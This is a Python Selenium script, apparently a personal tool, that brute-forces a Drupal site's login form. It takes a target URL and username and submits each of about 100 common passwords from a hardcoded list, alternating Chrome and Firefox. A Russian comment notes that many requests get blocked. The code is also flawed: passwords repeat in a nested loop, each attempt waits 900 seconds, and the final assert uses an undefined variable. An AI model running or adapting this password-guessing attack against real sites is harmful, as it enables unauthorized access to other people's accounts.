# -*- coding:utf-8 -*-
from selenium import webdriver
from selenium.webdriver.chrome import service
from selenium.webdriver.common.keys import Keys
from time import sleep
import os
import sys
import argparse
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

'''Большое количество запросов кидает в блок'''
 
def createParser ():
    parser = argparse.ArgumentParser(description='Process some value\'s')
    parser.add_argument('-url', '--u' , help = 'Add url admin form for drupal like www.site.org/user',dest='url')
    parser.add_argument ('-login', '--l', help='Add user what you want to check',dest='login')
    return parser


'''Класс драйвера и методов'''

class CheckPassForm():
    
    keys = ('123456, 12345, password, DEFAULT, 123456789, qwerty, 12345678, abc123, pussy, 1234567, 696969, ashley, fuckme, football, \
baseball, fuckyou, 111111, 1234567890, ashleymadison, password1, madison, asshole, superman, mustang, harley, 654321, 123123, hello, monkey, 0, \
hockey, letmein, 11111, soccer, cheater, \
kazuga, hunter, shadow, michael, 121212, 666666, iloveyou, qwertyuiop, secret, buster, horny, jordan, hosts, zxcvbnm, asdfghjkl, affair, dragon, \
987654, liverpool, bigdick, sunshine, yankees, asdfg, freedom, batman, \
whatever, charlie, fuckoff, money, pepper, jessica, asdfasdf, 1qaz2wsx, 987654321, \
andrew, qazwsx, dallas, 55555, 131313, abcd1234, anthony, steelers, \
asdfgh, jennifer, killer, cowboys, master, jordan23, robert, maggie, looking, \
thomas, george, matthew, 7777777, amanda, summer, qwert, princess, ranger, \
william, corvette, jackson, tigger, computer')
    
    def __init__(self,url,login):
            self.urls = url
            self.login = login
    
    def ChooseDriver (drivername,urls,login,passwd):
        
        if drivername == 'Chrome':
            driver = webdriver.Chrome()
        else:
            binary = FirefoxBinary (r'C:\\Program Files\\Mozilla Firefox\\firefox.exe')
            fx_capabilities = DesiredCapabilities.FIREFOX.copy()
            fx_capabilities['marionette'] = True
            driver = webdriver.Firefox(firefox_binary=binary,capabilities=fx_capabilities, executable_path='D:\\git_dir\\top_100_passwd\\geckodriver')
        
        driver.get(urls)
        elem = driver.find_element_by_id("edit-name")
        elem.send_keys(login)
        elem_2 = driver.find_element_by_id("edit-pass")
        elem_2.send_keys(passwd)
        result = driver.find_element_by_xpath("//*[@id='edit-submit']")
        result.click()
        sleep(900)
        driver.close()       
    
    def PasswordChekers(self):
        keys = CheckPassForm.keys.split(', ')
        for i in keys:
            for j in range(0, len(keys)):
                if j%2 == 0:
                    CheckPassForm.ChooseDriver('Chrome',self.urls, self.login,i)                      
                else:
                    CheckPassForm.ChooseDriver('Firefox',self.urls, self.login,i)
        assert "No results found." not in driver.page_source
    

if __name__ == "__main__":
    try:
        parser = createParser()
        data = parser.parse_args()
    
        instance = CheckPassForm('http://' + data.url,data.login)
        instance.PasswordChekers()
    except TypeError:
        print ("=" * 50)
        print ("| TOP-100 passdw script does't work whitout keys | \n| \t try and watch> python main.py -h\t | ")
        print ("=" * 50)
        print ("email:sergmadox@gmail.com")